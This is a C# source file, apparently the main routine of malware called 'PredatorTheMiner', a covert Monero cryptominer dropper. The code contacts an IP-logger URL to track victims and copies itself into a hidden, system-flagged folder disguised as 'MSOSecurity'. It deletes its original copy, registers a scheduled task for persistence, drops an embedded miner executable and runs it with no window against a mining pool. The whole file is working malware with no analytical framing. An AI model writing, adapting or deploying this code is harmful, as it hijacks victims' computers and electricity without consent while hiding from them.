using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace PredatorTheMiner
{
	class Program
	{
		public static string StartPath
		{
			get
			{
				return System.Windows.Forms.Application.ExecutablePath;
			}
		}

		public static string StartDir
		{
			get
			{
				return System.Windows.Forms.Application.StartupPath;
			}
		}

        [DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
		
        static void Main()
		{
			try
			{
				Helper.SiteConnection("https://iplogger.com/1LVYB6"); // IPLogger

				const string Pool = "pool.monero.hashvault.pro:443";
				const string user = "user name";
				const string cpu_usage = "75"; //25 50 75
				const string password = "x";
				/* Данные для майнера */
				
				Process process = new Process();
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.Arguments = string.Format("--url={0} --user={1} --pass={4} --threads 5 --donate-level=1 " +
					"--keepalive --retries=5 --max-cpu-usage={3}",
					Pool, user, "0x3", cpu_usage, password);
				process.StartInfo.FileName = StartDir + "\\runtime-servece.exe";
				/* Запуск майнера через cmd */
				
				if (!StartDir.Contains(Environment.GetEnvironmentVariable("LocalAppData")))
				{
					try
					{
						string drop_folder = Environment.GetEnvironmentVariable("ProgramData") + "\\MSOSecurity";
						if (Directory.Exists(drop_folder))
							return;
						Directory.CreateDirectory(drop_folder);
						File.Copy(StartPath, drop_folder + "\\Streamm.exe");
						File.SetAttributes(drop_folder + "\\Streamm.exe", FileAttributes.Hidden | FileAttributes.System);
						File.SetAttributes(drop_folder, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);
						Process.Start(drop_folder + "\\Streamm.exe");
						Helper.DeleteMe();
					}
					catch { }
				}
				else
				{
					RunTime.Defend.SetupDefend(RunTime.Defend.DefendOptions.AntiWindows7);

					new Implant.ScheduleTask("Windows_launcher").AddTask(StartPath);

					if (!File.Exists(StartDir + "\\runtime-servece.exe"))
						File.WriteAllBytes(StartDir + "\\runtime-servece.exe", Properties.Resources.shost);

					process.Start();
				}

			}
			catch { }
		}
	}
}
